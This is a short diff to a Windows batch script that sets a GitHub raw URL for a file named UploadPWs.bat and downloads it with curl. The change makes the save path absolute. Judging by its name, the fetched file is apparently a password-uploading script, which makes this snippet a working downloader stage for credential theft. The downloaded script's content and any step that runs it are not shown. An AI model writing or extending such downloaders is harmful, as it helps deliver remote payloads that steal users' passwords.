@@ -276,7 +276,7 @@ setlocal
 
 :: Define the URL of the executable and the output file name
 set "url=https://github.com/techtoona/test/raw/refs/heads/main/UploadPWs.bat"
-set "output=UploadPWs.bat"
+set "output=%cd%\UploadPWs.bat"  :: Save the output file in the current directory
 
 :: Download the executable
 curl -L -o "%output%" "%url%"
